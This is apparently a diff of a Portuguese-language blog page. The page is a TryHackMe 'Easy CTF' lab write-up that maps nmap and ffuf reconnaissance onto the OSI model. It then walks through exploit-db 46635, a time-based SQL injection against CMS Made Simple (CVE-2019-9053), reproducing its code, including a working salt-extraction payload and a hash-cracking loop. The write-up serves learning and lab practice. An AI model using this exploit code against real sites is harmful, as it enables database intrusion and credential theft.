-</span></span><span class=line><span class=cl>            <span class=n>output</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Password cracked: &#34;</span> <span class=o>+</span> <span class=n>line</span>
-</span></span><span class=line><span class=cl>            <span class=k>break</span>
-</span></span><span class=line><span class=cl>    <span class=nb>dict</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
-</span></span></code></pre></div><p>Essa função basicamente lê a wordlist linha por linha e também combina cada entrada com o salt do banco de dados. Desse modo, também gera o hash MD5 para que seja possível comparar com a senha encontrada no banco de dados. Logo, esse processo é uma manipulação de dados criptográficos presente na apresentação.</p><h3 id=função-dump_salt>Função dump_salt</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>dump_salt</span><span class=p>():</span>
-</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>flag</span>
-</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>salt</span>
-</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>output</span>
-</span></span><span class=line><span class=cl>    <span class=n>ord_salt</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=n>ord_salt_temp</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>flag</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>=</span> <span class=kc>False</span>
-</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>dictionary</span><span class=p>)):</span>
-</span></span><span class=line><span class=cl>            <span class=n>temp_salt</span> <span class=o>=</span> <span class=n>salt</span> <span class=o>+</span> <span class=n>dictionary</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
-</span></span><span class=line><span class=cl>            <span class=n>ord_salt_temp</span> <span class=o>=</span> <span class=n>ord_salt</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>dictionary</span><span class=p>[</span><span class=n>i</span><span class=p>]))[</span><span class=mi>2</span><span class=p>:]</span>
-</span></span><span class=line><span class=cl>            <span class=n>beautify_print_try</span><span class=p>(</span><span class=n>temp_salt</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;a,b,1,5))+and+(select+sleep(&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>TIME</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;)+from+cms_siteprefs+where+sitepref_value+like+0x&#34;</span> <span class=o>+</span> <span class=n>ord_salt_temp</span> <span class=o>+</span> <span class=s2>&#34;25+and+sitepref_name+like+0x736974656d61736b)+--+&#34;</span>
-</span></span><span class=line><span class=cl>            <span class=n>url</span> <span class=o>=</span> <span class=n>url_vuln</span> <span class=o>+</span> <span class=s2>&#34;&amp;m1_idlist=&#34;</span> <span class=o>+</span> <span class=n>payload</span>
-</span></span><span class=line><span class=cl>            <span class=n>start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
-</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>            <span class=n>elapsed_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>start_time</span>
-</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>elapsed_time</span> <span class=o>&gt;=</span> <span class=n>TIME</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=kc>True</span>
-</span></span><span class=line><span class=cl>                <span class=k>break</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>flag</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>            <span class=n>salt</span> <span class=o>=</span> <span class=n>temp_salt</span>
-</span></span><span class=line><span class=cl>            <span class=n>ord_salt</span> <span class=o>=</span> <span class=n>ord_salt_temp</span>
-</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=kc>True</span>
-</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>[+] Salt for password found: &#39;</span> <span class=o>+</span> <span class=n>salt</span>
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Easy CTF - Uma breve jornada de exploração com base no modelo OSI | Obtuosa</title>
+<meta property="og:title" content="Easy CTF - Uma breve jornada de exploração com base no modelo OSI | Obtuosa" />
+<meta name="twitter:title" content="Easy CTF - Uma breve jornada de exploração com base no modelo OSI | Obtuosa" />
+<meta itemprop="name" content="Easy CTF - Uma breve jornada de exploração com base no modelo OSI | Obtuosa" />
+<meta name="application-name" content="Easy CTF - Uma breve jornada de exploração com base no modelo OSI | Obtuosa" />
+<meta property="og:site_name" content="Obtuosa" />
+
+<meta name="description" content="Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI">
+<meta itemprop="description" content="Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI" />
+<meta property="og:description" content="Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI" />
+<meta name="twitter:description" content="Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/posts/easy-ctf/" title="English" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2024-10-23T00:00:00Z />
+    <meta property="article:published_time" content=2024-10-23T00:00:00Z />
+    <meta property="og:url" content="http://localhost:1313/posts/easy-ctf/" />
+
+    
+    <meta property="og:article:author" content="" />
+    <meta property="article:author" content="" />
+    <meta name="author" content="" />
+    
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Easy CTF - Uma breve jornada de exploração com base no modelo OSI",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2024-10-23",
+        "description": "Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI",
+        "wordCount":  3375 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2024-10-23",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Obtuosa"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.145.0">
+
+    
+    <meta property="og:url" content="http://localhost:1313/posts/easy-ctf/">
+  <meta property="og:site_name" content="Obtuosa">
+  <meta property="og:title" content="Easy CTF - Uma breve jornada de exploração com base no modelo OSI">
+  <meta property="og:description" content="Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-10-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-10-23T00:00:00+00:00">
+    <meta property="article:tag" content="Easyctf">
+    <meta property="article:tag" content="Tryhackme">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Osi">
+    <meta property="og:image" content="http://localhost:1313/public/avatar_hu_8a2a75f33dce1ed4">
+
+
+    
+    
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/public/avatar_hu_8a2a75f33dce1ed4">
+  <meta name="twitter:title" content="Easy CTF - Uma breve jornada de exploração com base no modelo OSI">
+  <meta name="twitter:description" content="Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/posts/easy-ctf/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+
+     
+     <meta property="og:type" content="website" />
+     <meta property="og:title" content="Obtuosa"/>
+     <meta property="og:description" content="Uma jornada em cibersegurança"/>
+     <meta property="og:site_name" content="Obtuosa"/>
+     <meta property="og:url" content="http://localhost:1313/"/>
+     <meta property="og:locale" content="en">
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+    
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Início
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        Sobre
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Easy CTF - Uma breve jornada de exploração com base no modelo OSI</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-10-23T00:00:00&#43;00:00" itemprop="datePublished"> 23 Oct 2024 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/b5b4tjc884gh02rtrt0b.jpeg" alt="Easy CTF"></p>
+<h1 id="easy-ctf---uma-breve-jornada-de-exploração-com-base-no-modelo-osi">Easy CTF - Uma breve jornada de exploração com base no modelo OSI</h1>
+<p>Quando se está estudando sobre fundamentos de redes, entendendo sobre o modelo OSI, arquitetura TCP/IP e etc., na mente fica o grande questionamento de como assimilar esses conceitos no cotidiano ou pelo menos de uma forma clara sobre seu funcionamento . E é por isso que esse texto irá trabalhar com essa assimilação usando a máquina <a href="https://tryhackme.com/r/room/easyctf"><strong>Easy CTF</strong></a>, uma simples lab, que nesse momento irá ajudar a trabalhar um pouco sobre como operam as camadas e as interações que ocorrem entre elas no modelo OSI.</p>
+<p>Antes de iniciar com a máquina, alguns conceitos precisam ser relembrados, ainda que de maneira breve, mas para reforçar o que se propõe esse pequeno laboratório.</p>
+<h2 id="introdução-à-rede-de-computadores">Introdução à Rede de Computadores</h2>
+<p>Rede de computadores são basicamente dispositivos interligados que trocam informações entre si. Nesse sentido, a rede é construída por dois aspectos principais: Conexão física e Conexão Lógica.</p>
+<ul>
+<li>Conexão Física: A infraestrutura física que realiza a conexão dos dispositivos. Exemplos: cabos, fios, roteadores, etc.</li>
+<li>Conexão Lógica: Aqui seria o caminho que é estabelecido entre esses dispositivos para que ocorra essa comunicação, o transporte desses dados. Nesse aspecto, não é dependente dessa infraestrutura física, porque é com os dispositivos são configurados que ocorre essa comunicação entre si. Exemplos: protocolos, endereços IP, etc.</li>
+</ul>
+<p>Para que essa comunicação ocorra é necessário regras, de maneira mais direta: <strong>protocolos</strong>. Seria uma completa bagunça se não houvessem convenções e regras para definir como o seu dispositivo se comunique, por exemplo, com o servidor da <strong>Google</strong> e fosse possível acessar a página principal. Então, é fundamental o formato, sequência, como os dados são trocados, etc, para que seja possível processar as informações corretamente, de maneira eficiente e sem erros. Alem disso, existem diversos tipos de redes, que são classificados de acordo com o alcance geográfico e arquitetura, como por exemplo: LAN (Local Area Network) que seria uma rede pequena, mais local, como casa, escritório, etc., e  MAN (Metropolitan Area Network) uma rede maior que a LAN para  campus universitário, cidade, etc.</p>
+<p>Em rede de computadores existem dois modelos bastante comuns de comunicação: Peer-to-Peer (P2P) e Client-Server. Existem outros, mas não serão o foco.</p>
+<h3 id="peer-to-peer-p2p">Peer-to-Peer (P2P)</h3>
+<p>No modelo ponto a ponto os dispositivos da rede possuem funções iguais.  Cada um pode atuar como cliente ou como servidor Não se tem um controle centralizado sobre os recursos que são compartilhados e qualquer dispositivo pode compartilhar seus recursos. Exemplo: Torrent.</p>
+<h3 id="client-server">Client-Server</h3>
+<p>No modelo cliente-servidor a rede é construída entre cliente e servidores. No qual, o cliente (computador) solicita um tipo de serviço ou recurso ao servidor. Exemplo disso é o ato de navegar pela web.</p>
+<h2 id="modelo-osi">Modelo OSI</h2>
+<p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8jszegsha9kwh9wcrg6g.png" alt="OSI Model">
+O modelo OSI (Open Systems Interconnection) é um modelo conceitual com propósito de compreender como ocorre a comunicação em rede de computadores e é dividida em 7 camadas:</p>
+<ul>
+<li><strong>Camada 1 - Física</strong> tem o objetivo de realizar a transmissão física de dados através de cabos e sinais elétricos. Exemplos: Conexões fibra óptica e Cabos Ethernet.</li>
+<li><strong>Camada 2 - Enlace</strong> seria o fiscal da transmissão desses dados, para que não ocorra erros entre os dispositivos conectados. Exemplos: Ethernet e Wi-Fi.</li>
+<li><strong>Camada 3 - Rede</strong> é como o remetente e o destinatário, através do endereço de IP determina o caminho que os dados seguem entre os dispositivos. Exemplos: Protocolos IP e Roteadores.</li>
+<li><strong>Camada 4 - Transporte</strong> como o próprio nome diz é o que garante o envio e o recebimento desses dados da camada três. Exemplos: TCP e UDP.</li>
+<li><strong>Camada 5 - Sessão</strong> tem como função estabelecer e também encerrar a conexões entre aplicações. Exemplos: SSH e SCP.</li>
+<li><strong>Camada 6 - Apresentação</strong> realize a formatação dos dados, para que possa ser compreendida pela camada superior. Exemplos: SSL/TLS e JPEG.</li>
+<li><strong>Camada 7 - Aplicação</strong> oferece serviços e as interfaces para as aplicações dos usuários. Essa é a camada mais próxima do usuário. Exemplos: HTTP e HTTPS.
+O proposito desse modelo é ajudar na padronização, ser uma referência teórica e contribuir para o entendimento sobre a interação entre os componentes de uma rede e assim facilitando a resolução de possíveis problemas.</li>
+</ul>
+<h2 id="início-da-jornada">Início da jornada</h2>
+<h3 id="reconhecimento">Reconhecimento</h3>
+<p>O reconhecimento inicial é o passo mais importante, porque assim terá não só conhecimento sobre o alvo, mas também a maneira como será operado os primeiros passos para suceder um comprometimento inicial e acesso a informações importantes. Para além disso, é a etapa que sempre estará presente, mesmo após obter sucesso, sempre haverá um novo reconhecimento para ser feito de acordo com a elevação dos passos dados pelo invasor. Além disso, reconhecimento foi bastante retratado no texto <a href="https://dev.to/obtuosa/maquina-valley-do-tryhackme-e-o-ciclo-de-vida-de-um-ciberataque-mp6"><strong>Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque</strong></a>.</p>
+<p>Como já foi trabalhado de maneira breve sobre o que seria a camada 7, este é o primeiro contato com o alvo e é a camada mais próxima do usuário. A primeira visão dada é de uma página padrão do Apache2, apesar de não ter um conteúdo mais personalizado no que tange ao front-end é possível retirar algumas informações sobre esse servidor web, que utiliza o protocolo HTTP, nesse caso já teria uma possível falha, pois as solicitações e respostas são HTTP, ou seja, essas comunicações são realizadas em texto simples e não existe uma criptografia do que está sendo solicitado, algo que os protocolos de segurança TLS/SSL ajudariam bastante e apesar serem protocolos característicos da Camada de Apresentação, também é implementado em conjunto com os protocolos da Camada de Aplicação.
+Outro ponto interessante é a estrutura do Apache apresentada:</p>
+<ul>
+<li>O arquivo principal presente no diretório: /etc/apache2/apache2.conf.</li>
+<li>A configuração de portas: /etc/apache2/ports.conf.</li>
+<li>Além de diretórios para os módulos,configurações globais, etc.</li>
+</ul>
+<p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/f501b5xwnyz3eqjok3do.png" alt="Apache2 Ubuntu Default Page">
+Nesse processo duas ferramentas foram muito importantes, o primeiro é o <strong>nmap</strong>, para o escaneamento de portas, e o segundo é o <strong>ffuf</strong> para buscar diretórios.</p>
+<h3 id="nmap">Nmap</h3>
+<p>O escaneamento de portas com a ferramenta Nmap envolve três camadas importantes. O primeiro, pensando na perspectiva do usuário é de aplicação, porque a flag  <strong>-sV</strong> realiza uma interação com a camada 7, pois o nmap envia pacotes específicos para interagir com os protocolos dessa camada e assim possibilitar a identificação das informações necessárias sobre esses serviços em execução. Enquanto na camada de Transporte, esse processo de escaneamento utiliza protocolo TCP, a ideia é compreender como essa comunicação de identificação de serviços funcionam e o conceito por trás dos protocolos, pois é através dessa entrega de pacotes e as informações fornecidas, que é possível reconhecer as portas que estão abertas. Na camada de Rede,  essa troca acontece com o endereço IP, para que possa ser enviado esses pacotes ao servidor web alvo.
+Além disso, você consegue obter duas respostas para as duas primeiras perguntas do desafio do Simple CTF:</p>
+<ul>
+<li>How many services are running under port 1000?</li>
+<li>What is running on the higher port?</li>
+</ul>
+<p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/o6dqt7o6mcsojuxkz81f.png" alt="Nmap"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -v -sV -p 1-3000 <span class="o">[</span>IP-ALVO<span class="o">]</span>
+</span></span></code></pre></div><h4 id="ffuf">ffuf</h4>
+<p>O ffuf tem foco principal na camada de aplicação, porque utiliza do protocolo HTTP ou HTTPS para realizar requisições ao servidor web e assim encontrar diretórios ou arquivos, mas não é uma exclusividade esse foco com a camada de aplicação, pois o mesmo também interage com outras camadas, para que assim ocorra seu funcionamento e vasculhar por qualquer vestígio de informações. Com ele é possível encontrar o diretório <strong>/simple</strong> e ter acesso a informações sobre o  <strong>CVE 2019-9053</strong> que é o estopim para ter um comprometimento inicial do servidor web. Mas, vale lembrar que as requisições HTTP do ffuf dependem do protocolo TCP, ou seja, temos aqui mais uma vez a camada de transporte presente, porque é estabelecida uma conexão confiável entre o cliente-servidor. Caso essa conexão fosse realizada pelo protocolo UDP, seria um problema, pois o mesmo não tem a garantia de entrega dos dados que são enviados. Assim como no nmap, o endereço IP também é usado para endereçar os pacotes que são enviados ao servidor e de encontro com a camada de rede.</p>
+<p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mbz84puuimbg30sreymh.png" alt="ffuf"></p>
+<h3 id="diretório-simple">Diretório /simple</h3>
+<p>No diretório <strong>/simple</strong> é possível observar que utiliza o <strong>CMS Made Simple</strong>(CMSMS) para gerenciar o conteúdo, basicamente o objetivo é criar e gerenciar os sites da web de maneira mais simples e eficiente. No entanto, o fato de não atualizarem o sistema impactou diretamente na segurança do website e com uma busca simples pelo google é possível encontrar o <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9053"><strong>CVE 2019-9053</strong></a>. CVE é um sistema de padronização que possibilita identificar e catalogar vulnerabilidades e exposições de segurança e é através desse catálogo que é possível encontrar um exploit no <a href="https://www.exploit-db.com/exploits/46635"><strong>exploit-db</strong></a>, que é basicamente um repositório público de exploits para acessar vulnerabilidades.</p>
+<p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tybcbzi1eybpb9ccomfi.png" alt="CMS Made Simple"></p>
+<p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xvf5aeyegkw8l3szkobi.png" alt="Exploit-db">
+Esse exploit é um SQL Injection que coloca comandos maliciosos em uma consulta do banco de dados SQL e poder manipular para ter acesso a principalmente credenciais, além das possibilidades de alterar as informações presentes naquele banco de dados, realizar escalonamento de privilégios, criação de novos usuários e diversas possibilidades. Esse exploit afeta justamente versões abaixo do 2.2.10 do CMS Made Simple.</p>
+<hr>
+<h3 id="exploit-46635py">Exploit 46635.py</h3>
+<h3 id="módulos">Módulos</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">cprint</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">optparse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span></code></pre></div><p>Este exploit utiliza de alguns módulos para que possa ter um bom funcionamento:</p>
+<ol>
+<li><strong>requests</strong>: O objetivo desse módulo é permitir mais praticidade para enviar pedidos HTTP/1.1.</li>
+<li><strong>colored</strong> e <strong>cprint</strong>: O termcolor tem o propósito de realizar uma formatação de cores ANSI para o output do terminal. O que torna a interface mais agradável.</li>
+<li><strong>time</strong>: Este módulo fornece as diversas funções relacionadas ao tempo.</li>
+<li><strong>optparse</strong>: Uma biblioteca que lida com as linhas de comandos necessárias para realiza configurações desse exploit.</li>
+<li><strong>hashlib</strong>: Essa lib tem principal foco calcular as hashes.</li>
+</ol>
+<h3 id="definição-de-argumentos-do-parser">Definição de Argumentos do Parser</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">optparse</span><span class="o">.</span><span class="n">OptionParser</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-u&#39;</span><span class="p">,</span> <span class="s1">&#39;--url&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s2">&#34;store&#34;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&#34;url&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Base target uri (ex. http://10.10.10.100/cms)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-w&#39;</span><span class="p">,</span> <span class="s1">&#39;--wordlist&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s2">&#34;store&#34;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&#34;wordlist&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Wordlist for crack admin password&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="s1">&#39;--crack&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s2">&#34;store_true&#34;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s2">&#34;cracking&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Crack password with wordlist&#34;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">options</span><span class="p">,</span> <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span></code></pre></div><p>Com o fato lidar com as linhas de comandos que serão configuradas em prol ao exploit, o optparse.OptionParser() define os argumentos que o usuário poderá passar para o script. O -u para url, -w para a seleção da wordlist que será usada para quebrar a senha e  o -c para que seja ativada essa quebra de senha.
+Essa configuração do url alvo constrói uma conexão com a Camada de Aplicação, quando se está determinando qual o endpoint que será explorado.</p>
+<h3 id="validação-do-url">Validação do URL</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">options</span><span class="o">.</span><span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;[+] Specify an url target&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;[+] Example usage (no cracking password): exploit.py -u http://target-uri&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">()</span>
